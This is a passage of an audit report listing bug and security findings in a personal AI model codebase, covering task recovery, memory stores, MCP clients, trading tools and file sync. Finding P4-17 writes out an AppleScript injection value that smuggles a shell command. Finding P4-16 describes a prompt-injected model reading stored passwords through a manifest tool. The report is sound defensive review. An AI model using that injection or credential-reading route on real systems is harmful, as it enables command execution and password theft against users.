- problem: `_recover_orphaned_tasks` only handles status RUNNING. `_run_task` sets VERIFYING and then performs a slow LLM call; if the process dies there, the task stays VERIFYING. `ready_tasks`/`retrying` ignore it and `in_flight` counts only READY/RUNNING/RETRYING. With dependent PENDING tasks the goal is set to BLOCKED with the false reason "remaining tasks depend on a task that will never complete"; with no dependents the goal stays EXECUTING forever.
- evidence: `in_flight = any(t["status"] in ("READY", "RUNNING", "RETRYING") for t in tasks)`
- scenario: the app is quit or crashes during the verification pass of the last task; after restart the goal never completes and never errors.
- fix: treat VERIFYING like RUNNING in `_recover_orphaned_tasks` (re-verify or retry), and count it in `in_flight`.

### P3-3 [medium] A non-numeric metric from sandboxed code makes _verdict_from_metrics raise and leaves the async run "running" forever
- where: dourmouse/atlas/atlas_proposals.py:525-530, 659, 709, 752-766
- problem: `_execute` is called in `_worker` with no try/except. Metrics come from LLM-authored code serialised with `default=str`, so `sharpe`, `mean_return` or `n_obs` can be a string or list. `_verdict_from_metrics` then does `sharpe > 0.5` and raises TypeError. Disk errors in `_execute` (mkdir/write_text on work_dir) or an exception from run_sandboxed have the same effect. The daemon thread dies silently, and the placeholder written at line 521 stays status "running" with no error and no finished_at.
- evidence: `if sharpe > 0.5:`
- scenario: strategy returns {"sharpe": "n/a", "mean_return": 0.1, "std_dev": 0.2, "n_obs": 10}; the UI polls get_run forever on a run that will never finish. The sync approve_and_run path raises TypeError into the HTTP handler instead.
- fix: wrap the `_worker` body in try/except Exception and store status="failed" with the error; coerce metrics with float() inside try in `_verdict_from_metrics`.

### P3-30 [medium] gmail_send skips recipient and subject validation on the OAuth path
- where: dourmouse/google_services.py:1683-1695 (versus 368-377)
- problem: the `if token:` branch returns `_gmail_send_oauth` before the checks for a valid `to` and a non-empty subject that the App-Password branch performs (lines 1689-1695). `_gmail_send_oauth` also assigns headers directly, so a newline in `to` or `subject` raises an uncaught ValueError (EmailMessage refuses it) instead of the contractual "ERROR: ..." string.
- evidence: `return _gmail_send_oauth(token, to, subject, body)` precedes the validation block
- scenario: the model calls gmail_send with an empty or comma-joined `to`, or an empty subject; the signed-in user's account sends an empty-subject message or the call crashes with a traceback, while the same call through the SMTP path would have been refused.
- fix: move the validation above the OAuth branch and catch ValueError.

### P3-34 [medium] drive_download reads the entire response into memory before enforcing its 50 MB limit
- where: dourmouse/google_services.py:1785-1790, 2060-2068
- problem: `_http_get` does `resp.read()` with no cap, and only afterwards does drive_download test `len(body) > 50 * 1024 * 1024` and decode the whole body to text (`body.decode(...)`) for the sign-in sniffing, doubling memory. The refusal message promises a size limit that is not applied while downloading.
- evidence: `return resp.status, resp.read(), ...`
- scenario: the model is pointed at a multi-GB link-shared file; the server process allocates it fully (and a decoded copy) before refusing, which can exhaust memory of the single app process.
- fix: read in chunks with a hard cap (as `_http_raw(max_bytes=...)` already does) and sniff only the first few KB.

### P3-36 [medium] Semantic recall can crash with a remote memory store, never fills its embedding cache after one failure, and mixes vectors from different models
- where: dourmouse/memory_embed.py:58-87, 116-143, 146-204
- problem: (1) `semantic_search` promises "never an error", but with DOURMOUSE_EMBED=1 and a remote store `store.all_facts()` raises RemoteMemoryStoreUnavailable (memory_store.py:644-645) and nothing catches it. (2) `ensure_embeddings` embeds all missing facts in one `embed_texts` call, which returns None if any single request fails or times out (10s each); the vectors computed before the failure are discarded and nothing is saved, so on a large store every search repeats the whole sequential pass and the cache never grows. (3) `get_embeddings()` returns cached vectors regardless of the model they came from; after DOURMOUSE_EMBED_MODEL changes, old vectors of another dimension score 0.0 and same-dimension ones give meaningless scores. (4) `[float(x) for x in vec]` is outside the try block, so a non-numeric element raises despite the "Never raises" docstring.
- evidence: `vectors = store.get_embeddings()` / `if batch is None or len(batch) != len(missing): return None`
- scenario: first semantic query against a few thousand facts blocks the request thread for minutes and caches nothing; a remote-memory setup with the gate on throws on every recall.
- fix: catch the store's Unavailable error and fall back to FTS5, save each vector as it is produced, filter cached vectors by model, and move the float conversion into the try.

### P3-40 [medium] mt5_probe panel command crashes whenever the account has any listed symbol, so the HUD MT5 panel never shows a universe
- where: dourmouse/mt5_probe.py:69-75
- problem: `found, missing = {}, []` makes `found` a dict, then the loop calls `(found if name else missing).append(...)`. For every code that IS listed, `dict.append` raises AttributeError. `main` catches it and emits `{"error": "worker failed ... 'dict' object has no attribute 'append'"}` with exit 1. `_run_worker` turns that into `configured: False` with that raw text, and `mt5_panel_snapshot` caches it. (`cmd_universe` right below it builds the same structure correctly with `found[code] = name`.)
- evidence: `(found if name else missing).append(` with `found, missing = {}, []`
- scenario: with the terminal logged into a demo account the panel reports NOT CONFIGURED with a Python error string instead of the account and symbols.
- fix: use `found[code] = name` in the panel branch as cmd_universe does.

### P3-41 [medium] MT5 demo/live detection is a server-name substring check, and order size has no cap
- where: dourmouse/mt5_ops.py:121-129, 246-312 (same logic copied at mt5_probe.py:138-145)
- problem: `_is_demo` returns True when the server name contains "demo" or "practice". MetaTrader5's `account_info().trade_mode` (ACCOUNT_TRADE_MODE_DEMO/CONTEST/REAL) is the authoritative field and is ignored. A live server whose name contains "demo" (or a broker alias) is treated as paper and skips the MT5_ALLOW_LIVE/MT5_CONFIRM_LIVE double gate, which the docstring says "never lets a stray flag turn paper into real orders". Separately, `volume` is only checked `> 0`; there is no upper bound or comparison with the symbol's volume_max (acknowledged as deferred at line 280), so a model-chosen lot size reaches `order_send` limited only by the broker and a confirmation text.
- evidence: `return "demo" in server or "practice" in server`
- scenario: a real-money account on a server named like "Broker-DemoAndLive" lets mt5_order place real orders with only the generic confirmation; a mistyped volume of 100 is sent as 100 lots.
- fix: decide on `info.trade_mode == mt5.ACCOUNT_TRADE_MODE_DEMO`, treat unknown as live, and add a configurable max volume.

### P3-43 [medium] orch_net builds a fresh NeuroStore on every call, so each prediction re-reads the whole experience log and the store's lock protects nothing
- where: dourmouse/orch_net.py:416-426, 662-669, 672-697, 441-476, 493-521
- problem: `open_store()` returns a new `NeuroStore` each time, and `__post_init__` reads and JSON-parses the entire experiences.jsonl to fill `_ids`. `neural_is_multi_step` and `neural_agent_scores` (called on the dispatch hot path) go through `_load_active_model` -> `open_store()`, so every prediction costs a full parse of an append-only file that grows without bound, although the docstring says the hot path has no work beyond an mtime check. Each instance also has its own `_lock` and `_ids`, so two threads logging through different instances append concurrently with no mutual exclusion, and `apply_feedback`'s `open("w")` rewrite of the file can truncate it while another instance appends, losing records. A single corrupt or half-written line makes `__post_init__` stop early (leaving `_ids` partial) and `load_experiences` return `[]` for the whole file, so training reports "no experiences" until the line is removed.
- evidence: `return NeuroStore(default_store_dir())` in `open_store`
- scenario: after a few thousand logged turns every chat turn pays an O(file) parse in the routing step; a crash mid-append (or a concurrent feedback rewrite) silently disables learning.
- fix: cache one NeuroStore per directory, load `_ids` lazily once, write the rewrite via temp file + `os.replace`, and skip bad lines instead of aborting.

### P3-47 [medium] project_bookkeeper has no lock and non-atomic whole-file writes, so a refresh can erase a project created or hidden while it ran
- where: dourmouse/project_bookkeeper.py:135-152, 335-418, 486-546, 623-650
- problem: `refresh` loads the store at line 337, then spends time scanning session files and the Codex DB, then writes back `manual_projects` and `hidden_paths` from that stale copy. `create_project`, `delete_project` and `open_project` each do their own load-modify-save with no lock. The HTTP server is threaded, and `get_bookkeeper` also triggers a refresh. Whichever save lands last wins, so a project created (or deleted/hidden) during a refresh is lost on the next write. `_save_store` also writes in place, so a concurrent reader can see a truncated file, and `_load_store` then returns an empty store.
- evidence: `"manual_projects": store.get("manual_projects", {}),` built from the pre-scan `store`
- scenario: the user clicks "new project" while the shelf is refreshing; the project disappears (its folder remains), or a hidden project re-appears.
- fix: hold one module lock around every load-modify-save, reload manual_projects/hidden_paths just before the refresh write, and write via temp file + `os.replace`.

### P3-49 [medium] Practice scores are graded against the raw bytes of a PDF decoded as text, so they are meaningless
- where: dourmouse/research_mesh/study.py:207-226 (same pattern at dourmouse/research_mesh/exams.py:88-89)
- problem: `load_corpus` only accepts `*.pdf` keys, but `_practice` and `_practice_all` call `p.key_path.read_text(errors="replace")` and feed that to `grade_answer`, which scores the fraction of the key's tokens found in the answer. For a real key this yields tens of thousands of binary-stream tokens, and the score is effectively zero (or random) for any genuine answer. The dossier docstring says "nothing is fabricated" and `practice_scores` is stored in the StudyDossier.
- evidence: verified on jarvis/.../Survival Analysis/keys/May2014QualsSolution.pdf: decoding gives 4.77M chars with 831,842 tokens, 28,006 distinct, such as '00yj', '01kc'. The file is also exactly 5,000,000 bytes, which suggests a capped download.
- scenario: with a real brain the practice phase reports near-zero scores for correct answers; the held-out qualification check in exams.py (same read) then fails every keyed paper regardless of the answer quality.
- fix: extract the PDF text (pdf_reader) before grading, and skip or flag keys that cannot be extracted.

### P3-51 [medium] extract_html.extract_main raises RecursionError on deeply nested pages, and the fetch path does not catch it
- where: dourmouse/research_pipeline/extract_html.py:167-177, 260-291 (called from acquire.py:151 and :258)
- problem: `_prune` and `_serialise.walk` recurse once per DOM nesting level, while the tree builder happily nests thousands of unclosed `<div>` elements. Verified: `extract_main("<html><body>" + "<div>"*1500 + "hello world "*50)` raises RecursionError. `acquire._decode` and `html_to_text` call it with no guard (the only broad except in acquire.py is around render).
- evidence: `_prune(c, inside, page_chars)` recursion in `_prune`
- scenario: any web page (hostile or merely broken, such as thousands of unclosed tags) that the research pipeline or fetch_url retrieves aborts the whole fetch/ingest step with RecursionError instead of falling back to `_strip_tags`.
- fix: make `_prune` and `walk` iterative (or cap depth), and wrap extract_main in html_to_text/_decode with a fallback to `_strip_tags`.

### P3-54 [medium] run_follow_up closes a task as DONE even when no evidence was gathered, so the contradiction is never retried but the synthesis is revised as if settled
- where: dourmouse/research_pipeline/stages.py:564-587, 599-608
- problem: every `extract_evidence` failure is swallowed (`except ValueError: continue`) and `discover_sources` may add no new URLs; `record.complete_task(task_id)` runs unconditionally afterwards. `spawn_task_for` is idempotent per contradiction key and returns the existing DONE task, so no new attempt is ever made. `run_backward_edge` then sees no open tasks, re-runs detection and writes a "revised" synthesis. Separately, `next(t for t in record.tasks if ...)` raises a bare StopIteration for an unknown task id instead of ValueError.
- evidence: `record.complete_task(task_id)` after the loop with no count of claims added
- scenario: both follow-up sources fail the verbatim-passage check; the task is marked DONE, the synthesis is regenerated from the same claims, and the record presents the backward edge as complete while the contradiction was never investigated.
- fix: complete the task only when at least one task-tagged claim was added (otherwise leave it OPEN or mark it FAILED with a reason), and raise ValueError for an unknown task id.

### P3-60 [medium] Listening-port exposure classification misreads bracketed IPv6 addresses, so IPv6 loopback and all-interface listeners come out as UNKNOWN
- where: dourmouse/security/platform_adapter.py:213-227, 230-254
- problem: lsof prints IPv6 binds in brackets (this Mac shows `TCP [::1]:18789 (LISTEN)`), and `_LSOF_LISTEN_RE` captures the bracketed text unchanged. `_classify_exposure` compares it with "::1" and "::" without brackets, so `[::1]` and `[::]` both return UNKNOWN. A service listening on `[::]` (every interface, including the LAN) is never classified ALL_INTERFACES and so never produces an exposed-port finding, whereas `get_established_connections` strips the brackets. The ranges are also loose: any "100." address is called TAILSCALE (only 100.64.0.0/10 is) and any "172." address is called LOCAL_NETWORK (only 172.16.0.0/12 is private).
- evidence: verified: matching `TCP [::]:9000 (LISTEN)` gives bind_address `[::]` and exposure UNKNOWN (an IPv4 `*:3000` gives ALL_INTERFACES).
- scenario: a dev server bound to the IPv6 wildcard is reachable from the LAN but the "exposure" dimension of the security report shows nothing for it.
- fix: strip the brackets (and any zone id) before classifying, and use `ipaddress` network membership for the private and CGNAT ranges.

### P3-63 [medium] The Spotify login callback port defaults to the same port as the TV webhook server, and a failed callback bind is swallowed after the tool claims a browser tab opened
- where: dourmouse/spotify_services.py:70, 336-342, 380-393 (versus dourmouse/tv_webhook_server.py:31)
- problem: `SPOTIFY_REDIRECT_PORT` defaults to 8766 and tv_webhook_server's `_DEFAULT_PORT` is also 8766. With the webhook listener running, `DourmouseHTTPServer(("127.0.0.1", 8766))` fails with OSError. In the background path (`spotify_login(background=True)`, the tool and panel route) that error is swallowed by `_work`, no browser is opened, yet the tool already returned "SPOTIFY LINK STARTED: a browser tab opened". Even without a conflict, `_start_callback_server` is called before the `try/finally`, so a bind error escapes with nothing reported in foreground mode too.
- evidence: `f"SPOTIFY LINK STARTED: a browser tab opened — approve the app "` returned before the thread runs
- scenario: the user presses [LOGIN] in the Spotify panel while the TV webhook is up; the panel says a tab opened, nothing appears, and status() stays "not linked".
- fix: bind the callback server before returning the "started" message (or report the failure through status()), and give the two services different default ports.

### P3-68 [medium] The tray kill switch is fail-open on a bad state file, and its in-memory copy overwrites changes made by other processes
- where: dourmouse/tray.py:100-125, 150-189, 313-325
- problem: (1) `load_state` returns both flags enabled for a missing, unreadable, truncated or non-dict state file, so a corrupt privacy file silently re-arms mic and camera; `save_state` writes in place (no temp file), so a crash or concurrent write mid-write produces exactly that file. (2) `KillSwitch` loads the state once in `__init__` and never re-reads it, although the docstring calls it a persisted, cross-process flag that overlay.py and the vision bridge share. `_set` writes back the whole stale in-memory record, so toggling the mic in the tray rewrites `camera_enabled` to whatever the tray last saw, which can undo a camera kill made from another process.
- evidence: `data = asdict(self._state)` followed by `save_state(self._state, self._path)`
- scenario: the camera is killed from the overlay; the owner then clicks "Mic enabled" in the tray and the camera flag flips back to enabled, with the icon still showing the old state until the next click.
- fix: re-read the file under the lock inside `_set`, write atomically (temp file + replace), and treat an unreadable existing file as "killed" rather than enabled.

### P3-69 [medium] The "local" backtest target can never load data: its loader always raises and claims ATLAS_DATA_PATH is unset
- where: dourmouse/atlas/atlas_proposals.py:573-577, 681-686 (the 15 harness.py files under dourmouse/workspace/atlas_lab/tmp show the generated result)
- problem: the module docstring says the local target is "same sandboxed harness, pointed at ATLAS_DATA_PATH on this machine", but `_LOCAL_LOADER_BODY` is a constant that unconditionally raises RuntimeError("... ATLAS_DATA_PATH is not set ..."). ATLAS_DATA_PATH is never read anywhere in this file (the only mentions are in comments and that string). So every approved local run for a strategy that calls `load()` fails, and the error text blames a missing variable even when it is set. `_DESKTOP_LOADER_BODY` (the real loader) is defined but never used. Every generated harness in the workspace is the same always-raising stub. The only runs that can succeed are strategies that never load data.
- evidence: `"ATLAS_DATA_PATH is not set to a data_registry.py root. "` inside a loader body that is always `raise RuntimeError(`
- scenario: the user configures a local data registry and approves a proposal; the run fails with "not set" and the UI shows a failed backtest, with no way to make the local target work.
- fix: build the loader from ATLAS_DATA_PATH when it is set (and report NOT CONFIGURED only when it is not), or remove the target from the UI.

### P3-9 [medium] stream_claude reports a timeout kill as "NOT SIGNED IN"
- where: dourmouse/code_backends.py:925-933, 1043-1050
- problem: on timeout the watchdog just kills the process; stdout ends, `returncode` is -9 (or None if the post-kill wait is skipped) and stderr is empty. The `if not err:` branch then raises "claude exited 1 with no error output ... installed but NOT SIGNED IN". The non-streaming `_run_claude` has a dedicated timeout message; the streaming path, which the CODE screen uses with timeout=300, has none.
- evidence: `"is that the CLI is installed but NOT SIGNED IN - run "`
- scenario: a long coding turn exceeds 300s, the user is told to log in again and the real cause (timeout) is hidden; partial streamed text was already shown.
- fix: have the watchdog set a `timed_out` flag and raise "claude timed out after {timeout}s" when it is set.

### P4-10 [medium] browser_creds_store wipes the whole vault when it reads a corrupt or half-written file, and creates it world-readable before chmod
- where: dourmouse/browser_agent.py:1894-1910 (also 1949)
- problem: an unreadable vault is silently treated as `data = {}` and then overwritten with only the new entry, destroying every other stored credential. The write is a plain non-atomic `write_text` with no lock, then `os.chmod(0o600)` afterwards, so for a moment the file exists with the default umask (typically 0644) and containing passwords, and a crash or a concurrent store call mid-write leaves truncated JSON that triggers the wipe above.
- evidence: `except Exception:  # noqa: BLE001` then `data = {}` followed by `_VAULT_PATH.write_text(json.dumps(data, indent=2), ...)`
- scenario: two tool calls store credentials at nearly the same time (parallel tool calls), or the process is killed during a write; the next store call replaces the vault with a single site. Meanwhile any local user can read the new file in the window before chmod.
- fix: refuse to overwrite when the existing file fails to parse (rename it to .corrupt), write to a temp file created with `os.open(..., 0o600)` and `os.replace`, and hold a lock around read-modify-write.

### P4-16 [medium] read_manifest_entry / list_manifest read any JSON object file the model names, ungated, which exposes other stores such as the browser credential vault
- where: dourmouse/design_3d_ops.py:73-82, 298-313, 456-491
- problem: `manifest_path` is accepted verbatim from the tool arguments (any path, `~` expanded) and `_load_manifest` accepts any JSON object. read_manifest_entry returns `json.dumps({name: entry})` for the whole entry, and the error branch lists every key. These two tools carry no confirmation (only write does).
- evidence: `return Path(explicit).expanduser()` then `return json.dumps({name: entry}, indent=2)`
- scenario: prompt-injected or confused model calls read_manifest_entry with manifest_path=<project>/data/browser_creds.json and name=<site> (names are listed by the error text), and gets the stored username and plaintext password, defeating browser_agent's "passwords are NEVER returned by any tool". Any other dict-shaped JSON secret file (tokens, settings) leaks the same way.
- fix: confine manifest_path to the workspace/design_3d directory (resolve and check `is_relative_to`), and refuse paths outside it unless confirmed.

### P4-17 [medium] DesktopBridge.split_with_app interpolates an unvalidated bundle_id into AppleScript, allowing `do shell script` from page JavaScript
- where: dourmouse/desktop.py:414-436
- problem: the comment says bundle ids are "always interpolation-safe", but `bundle_id` is a bridge argument supplied by the page (window.pywebview.api.split_with_app), not taken from list_running_apps, and is never checked against `[A-Za-z0-9.-]`. It is placed inside double quotes in the script run by `osascript -e`. A quote in it ends the string and lets arbitrary AppleScript (including `do shell script`) run. The class docstring promises "NO shell, no paths, no exec".
- evidence: `app_ref = f'id "{bundle_id}"'`
- scenario: any script that runs in the main webview (an XSS in rendered model/web content, or any non-app page the shell is navigated to; js_api is exposed to every page the window loads) calls split_with_app("x", 'x" to activate\ndo shell script "..."\ntell application id "x') and executes commands as the user.
- fix: validate `bundle_id` with `re.fullmatch(r"[A-Za-z0-9.-]{1,255}", ...)` and otherwise fall back to the escaped name path (also escape newlines in `_applescript_escape`, which currently only escapes backslash and quote).

### P4-21 [medium] ChatSession(session_file=None) used as a throwaway helper writes real ledgers into workspace/sessions, which the app then resumes as "the most recent conversation"; same-second helpers share one ledger
- where: dourmouse/chat.py:54-76, 124-133 (callers: device_wiki/stages.py:86, research_pipeline/stages.py:160,307,383,519, research_pipeline/hypotheses.py:67, research_mesh/brain.py:233, goal_runtime.py:417,474)
- problem: a `None` session_file defaults to `workspace/sessions/session_<YYYYmmdd_HHMMSS>.jsonl`, so each tool-less helper call (wiki summary, research stage, hypothesis, mesh answer, goal check) creates a full persisted ledger and `.messages.json`. `most_recent_session_file()` (used by desktop.py:1266 and webui.py:8985 to restore the chat on launch) picks the newest mtime, so after a background job it returns a helper session instead of the user's conversation. The name has one-second resolution and `_load_state` resumes any existing snapshot, so two helper sessions started in the same second (threads, a failing or fast backend) share one file and the second one starts with the first one's messages (file contents, prompts) in its history.
- evidence: `f"session_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jsonl"` with `most_recent_session_file` returning `max(candidates, key=lambda p: p.stat().st_mtime)`
- scenario: a device-wiki scan or goal verifier runs overnight; next launch restores a "conversation" that is a summarizer prompt with file text, and the user's real chat is gone from the restored view. Two parallel wiki summaries can see each other's file contents.
- fix: give helper sessions an ephemeral (no-persist, or unique uuid and separate directory) mode, and have most_recent_session_file skip them.

### P4-23 [medium] FreebuffEventWatcher blocks on resp.read(4096), so events are held back until 4 KB arrives, and an idle stream is treated as offline after 30 s with the buffered data dropped
- where: dourmouse/freebuff_events.py:173, 181-192
- problem: `http.client.HTTPResponse.read(amt)` does not return early; it blocks until `amt` bytes have arrived or EOF (this also holds for chunked bodies). The SSE loop therefore only sees an event once 4096 more bytes are available. The socket has `timeout=30`, so if the stream is quiet for 30 s (small events, no keep-alive), read raises TimeoutError (an OSError), which `_run` reports as "offline"; the half-filled `buf` and any complete events inside http.client's partial read are discarded.
- evidence: `chunk = resp.read(4096)`
- scenario: a Freebuff thread starts and finishes a short turn producing a few hundred bytes of SSE; the HUD feed shows nothing, then a "watch offline" event appears 30 s later and the transitions are lost; after reconnect the next snapshot is diffed against stale state.
- fix: read with `resp.read1(4096)` or iterate `resp.readline()`, and treat a read timeout as an idle stream (continue) rather than an error.

### P4-24 [medium] guardrails.py is described as "the SAFETY BOUNDARY" but nothing in production calls evaluate_trade or KillSwitch.update, and evaluate_trade never looks at start_of_day_equity
- where: dourmouse/guardrails.py:1-20, 213-283 (callers: only config.py imports GuardrailConfig; t212_order and mt5_order do not call it)
- problem: a repo-wide search finds no non-test caller of `evaluate_trade`, `KillSwitch` (guardrails) or `evaluate_paper_gate`. The order tools (trading212_ops.py:157, mt5_ops.py:246) rely only on a human confirmation prompt, so max position, sector concentration, the daily-loss latch and the paper gate described in the docstring are not enforced anywhere. Even if wired, evaluate_trade only consults `kill_switch.tripped`; `account.start_of_day_equity` is never used inside it, so the daily-loss limit is enforced only if every caller remembers to call `kill_switch.update(...)` first.
- evidence: `ks_ok = not kill_switch.tripped`
- scenario: an operator sets DOURMOUSE_MAX_POSITION_PCT and the daily loss limit believing orders are checked; a confirmed order of any size or after a 10% daily loss goes straight to the broker.
- fix: call evaluate_trade (with an updated KillSwitch) inside t212_order and mt5_order before submission and refuse on `approved=False`, or remove the claim from the docs.

### P4-26 [medium] The remote reference file is set with `touch -t` from a UTC timestamp, but touch interprets -t in the remote's local time zone
- where: dourmouse/history_sync.py:239-245
- problem: `dt` is built with `tz=timezone.utc` and formatted as CCYYMMDDhhmm.SS, then passed to `touch -t` on the remote. POSIX/BSD `touch -t` reads that stamp in the remote machine's local time (unless TZ=UTC is set in the command). On a Mac west of UTC the reference file's mtime ends up N hours later than `since_epoch`, so every session file modified in the N hours after the last sync is "older" than the marker and `find -newer` never lists it, and the local marker then moves past it.
- evidence: `f"touch -t {touch_ts} /tmp/dourmouse_sync_marker && "` with `touch_ts = dt.strftime("%Y%m%d%H%M.%S")` on a `timezone.utc` datetime
- scenario: Mac in UTC-7: last sync at 10:00 UTC; the user chats from 11:00 to 16:00 UTC (stored mtime within the 7 hour shift); the next sync sets the marker to 17:00 UTC-as-local and finds none of those sessions; they are never imported (silent permanent gap). East of UTC the effect is repeated re-pulls instead.
- fix: run `TZ=UTC touch -t ...` on the remote (or format the stamp in the remote's zone).

### P4-27 [medium] sync_and_import advances the sync marker even when some scp pulls failed
- where: dourmouse/history_sync.py:259-291, 324-328
- problem: `pull_files` swallows timeouts and non-zero scp results (`continue`) and returns only a count; `sync_and_import` never compares `pulled` with `len(changed)` and always writes the marker afterwards, although its docstring says "advance the marker only on a clean run".
- evidence: `_write_marker(mirror_root, now)  # reached the remote cleanly this round`
- scenario: a laptop sleeping mid-run, a Wi-Fi blip or a locked file makes 3 of 40 scp calls fail; the marker moves forward, and those 3 sessions are never listed again by `find -newer`, so they are permanently missing from imported history.
- fix: only advance the marker when `pulled == len(changed)` (or keep a retry list of failed relative paths).

### P4-29 [medium] The librarian's own archive folder is under a default scan root, so archived duplicates are re-indexed and re-proposed as duplicates of their keeper
- where: dourmouse/librarian.py:41-42, 82-89, 99-100, 143-148, 273-282
- problem: `archive_root()` is `~/Documents/Dourmouse Archive`, and `~/Documents` is a default root. `SKIP_DIRS` does not contain the archive folder, so after a move the archived copy is walked, hashed (same size, so it is a hash candidate) and grouped with its keeper. The duplicates proposal sorts members by (copy-looking name, mtime, path length), so the archived copy (mtime preserved by the move) becomes an "extra" whenever its path is not shorter than the keeper's, and the proposal re-appears; when the keeper's path is longer than the archive path the archived copy is chosen as the keeper and the real file is proposed for archiving instead.
- evidence: `return Path.home() / "Documents" / "Dourmouse Archive"` next to `dirnames[:] = [d for d in dirnames if d not in SKIP_DIRS ...]`
- scenario: the owner approves "duplicates"; after the next full pass the same proposal shows up again, and applying it renames files inside the archive to `name (timestamp).ext` or moves an original (e.g. a deeply nested one) out of the user's tree even though a copy is already archived; the proposal never converges.
- fix: skip `archive_root()` (and its children) in `_iter_files` and exclude archive paths from `proposals()`.

### P4-32 [medium] The task list treats an unreadable tasks.json as empty and the next add_task overwrites it, destroying every task; writes are non-atomic and unlocked
- where: dourmouse/live_feeds.py:444-461, 477-507
- problem: `_load_tasks` returns `[]` on JSONDecodeError/OSError/non-list, and add_task/complete_task then write that (near-)empty list back over the file. `_save_tasks` uses `path.write_text` in place (truncate then write) with no temp file or lock, so a crash or two concurrent tool calls (read-modify-write race) can leave a truncated file or lose an update; ids are `task-<len+1>`, so concurrent adds also produce duplicate ids.
- evidence: `except (json.JSONDecodeError, OSError): return []`
- scenario: the app is killed mid-write; tasks.json is truncated; the next "add a task" call silently replaces the whole list with one task. Or two parallel add_task calls both read N tasks and both write id task-(N+1), the later one dropping the earlier.
- fix: on a parse error keep the bad file (rename to .corrupt) and raise, write via temp file plus os.replace under a lock, and generate ids from max(existing)+1 or a uuid.

### P4-33 [medium] The Codex MCP registration omits PYTHONPATH, so the bridge cannot import dourmouse unless Codex happens to run from the repo root (the bug already fixed for Claude)
- where: dourmouse/mcp_bridge.py:407-439 (compare 365-404)
- problem: `build_mcp_config_file` documents that `dourmouse` is not an installed package and passes `env: {"PYTHONPATH": repo_root}`. `ensure_codex_mcp_registered` registers `python -m dourmouse.mcp_bridge` with no env and no cwd. Verified: from another directory `import dourmouse` raises ModuleNotFoundError with this venv. The "already registered" check is also only `"dourmouse" in stdout`, so a stale registration (moved venv, different sys.executable) is never repaired.
- evidence: `[cli, "mcp", "add", "dourmouse", "--", sys.executable, "-m", "dourmouse.mcp_bridge"]`
- scenario: Codex is launched by the code backend from the workspace directory; its MCP server for dourmouse dies with ModuleNotFoundError, Codex silently proceeds without Dourmouse tools and tells the user it cannot reach mail, tasks or the browser.
- fix: register with `--env PYTHONPATH=<repo root>` (or `-c "import sys; sys.path.insert(...)"`), and compare the registered command against the current one.

### P4-35 [medium] McpClient never matches a response to its request id, so any server notification or stray line desyncs every later reply
- where: dourmouse/mcp_client.py:194-208
- problem: `_request` writes one request and then takes the very next line from stdout as its answer, without checking `message["id"] == msg_id` and without skipping lines that have a `method` (server-sent notifications such as `notifications/message`, `notifications/tools/list_changed`, or server requests like `ping`/`roots/list`). A notification line has neither `error` nor `result`, so it is returned as `{}` ("success" with no tools / empty text) and the real response stays in the pipe to be consumed as the answer to the next request.
- evidence: `return message.get("result") or {}`
- scenario: an external MCP server logs a progress notification before replying; call_tool returns an empty string for a call that actually ran, and every subsequent tool call returns the previous call's result (off by one) for the rest of the session.
- fix: loop reading lines until one has `id == msg_id` (ignoring or handling lines that carry `method`), with a deadline.

### P4-36 [medium] External MCP servers are started with no enforced timeout and no shutdown, and every build_general_registry() call relaunches them all
- where: dourmouse/mcp_client.py:118-156, 217-232; dourmouse/general_roster.py:6679-6683 (callers: model_delegation.py:271, model_context.py:41, orch_net.py:858, self_extensions.py:469, dispatch.py:3311)
- problem: `_readline` deletes its `timeout` argument and blocks on `readline()`, so a configured server that never answers `initialize` hangs `build_external_mcp_subagent`, and with it registry construction (app start-up, and any delegated turn). The `started` clients are returned as `_mcp_clients` but nothing ever closes them. `build_general_registry()` is called per delegated task (model_delegation.py:271) and several other places, so each call spawns a fresh process for every configured server and leaks the previous ones. `call_tool` also holds `self._lock` during the blocking read, so one hung call blocks every other thread using that server.
- evidence: `del timeout` then `return self._stdout.readline()`
- scenario: mcp_servers.json lists `npx -y some-server`; the first start-up waits on a download prompt and the whole app never finishes launching; or after 20 delegated tasks there are 20 orphaned server processes per configured server.
- fix: read in a worker thread (or use selectors/`select` on the pipe) with a real deadline and terminate the process on timeout; cache the built subagent and its clients per process and close them at shutdown.

### P4-37 [medium] Every chat turn re-ingests the whole session ledger, rewriting every old fact and deleting all of their cached embeddings
- where: dourmouse/memory_store.py:190-241, 387-413 (caller chat.py:322)
- problem: ChatSession.ask calls `memory.ingest_session_file(self.session_file)` after each turn, which calls `remember` for every turn so far. `remember` has no "unchanged" short-circuit for the same (source, title): it always runs the upsert (firing the facts_au trigger: FTS delete plus insert, and `updated_at` bump), then unconditionally `DELETE FROM fact_embeddings` for that fact and commits. Cost per turn grows with the conversation (quadratic overall) and the semantic-recall cache for session facts is destroyed again on every turn.
- evidence: `"DELETE FROM fact_embeddings WHERE fact_id = (SELECT id FROM facts WHERE source = ? AND title = ?)"`
- scenario: a 300-turn conversation does 300 upserts, 300 FTS rewrites and 300 commits after each new message; with DOURMOUSE_EMBED on, session facts are re-embedded on every semantic search because their vectors are wiped each turn.
- fix: in remember, skip the write (and the embedding delete) when the existing row has the same content_hash; make ingest_session_file incremental (only turns after the last stored one).

### P4-39 [medium] RemoteMemoryStore does not convert read timeouts or connection resets into RemoteMemoryStoreUnavailable, so LocalFallbackMemoryStore never falls back in those cases
- where: dourmouse/memory_store.py:509-538 (consumer 721-758)
- problem: `_send` catches `HTTPError` and `URLError` only. A timeout or reset after the connection is established surfaces from `resp.read()` as a bare `TimeoutError`/`ConnectionResetError` (OSError subclasses that are not URLError), and non-JSON 200 bodies raise `json.JSONDecodeError`. None of these is a RemoteMemoryStoreUnavailable, so LocalFallbackMemoryStore (which catches only that type) re-raises them. Also an HTTP error body without an "ok" key is returned as a normal result, so `count()` reports 0 for a 401 or 500 error body.
- evidence: `except urllib.error.URLError as exc:` as the last handler around `with urllib.request.urlopen(req, timeout=self.timeout) as resp: return json.loads(resp.read().decode())`
- scenario: the desktop memory host accepts the connection and stalls (asleep, mid-reboot): every memory tool call and every chat turn that recalls or remembers raises instead of using the local fallback; a 401 from a wrong token makes count() return 0.
- fix: catch `(OSError, ValueError)` around the whole request and raise RemoteMemoryStoreUnavailable; check `ok`/status for count().

### P4-4 [medium] probe_ollama_fallback and the "try default local Ollama" branch always fail: probe hits http://127.0.0.1:11434/models, which does not exist
- where: dourmouse/backend_fallback.py:15-22, 75, 113-114
